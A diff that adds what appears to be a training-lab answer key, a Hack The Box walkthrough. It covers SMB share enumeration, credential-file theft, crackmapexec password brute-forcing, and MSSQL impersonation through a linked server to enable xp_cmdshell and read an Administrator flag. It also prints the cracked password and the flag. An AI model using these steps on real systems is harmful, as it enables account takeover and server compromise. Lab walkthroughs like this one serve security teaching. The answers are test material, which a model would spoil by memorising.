@@ -999,3 +999,45 @@ $$ echo '-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA
 $chmod 600 id_rsa
 $ssh -i id_rsa simon@10.129.229.46
 cat flag.txt
+
+
+<test>"What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)"
+$ nmap -A -Pn 10.129.112.104
+$ smbclient -N -L 10.129.112.104
+$ smbclient -N //10.129.112.104/Home
+cd IT/Fiona\
+get creds.txt
+cd ../Simon\
+get random.txt
+cd ../John\
+prompt
+mget *
+<test>"Enumerate the target and find a password for the user Fiona. What is her password?"
+$ cat creds.txt secrets.txt random.txt > passwords.txt
+Then, with the generated passwords wordlist, students need to use crackmapexec to bruteforce the password of the user fiona on SMB:
+sudo cme smb STMIP -u fiona -p passwords.txt
+48Ns72!bns74@S84NNNSl.
+
+<test>"Once logged in, what other user can we compromise to gain admin privileges?"
+$ xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl'
+-Thereafter, students need to connect to the default MSSQL instance by using Windows Authentication mode, providing the name of the computer WIN-HARD for the -S option:
+PS C:\Users\Fiona> SQLCMD.EXE -S WIN-HARD
+-Subsequently, students need to identify users that can be impersonated as, finding john and simon:
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+GO
+The answer will be the user john.
+
+<test>"Submit the contents of the flag.txt file on the Administrator Desktop."
+-to query for linked servers from the sysservers table, finding one named LOCAL.TEST.LINKED.SRV (1 for isremote implies that the server is a remote one, while 0 implies that it is a linked one):
+SELECT srvname, isremote FROM sysservers
+GO
+-From the previous question, students know that they can impersonate the user john, therefore, they need to check if john can connect to LOCAL.TEST.LINKED.SRV as a sysadmin:
+EXECUTE AS LOGIN = 'john'
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+GO
+-From the output, students know that john can connect to LOCAL.TEST.LINKED.SRV as the sysadmin user testadmin. Thus, with john being a sysadmin, students can enable xp_cmdshell on LOCAL.TEST.LINKED.SRV so that they can run commands afterward:
+EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+GO
+At last, students need to print out the contents of the flag file "flag.txt", which is under the c:\users\administrator\desktop\ directory, finding it to be HTB{46u$!n9_l!nk3d_$3rv3r$}:
+EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
+GO
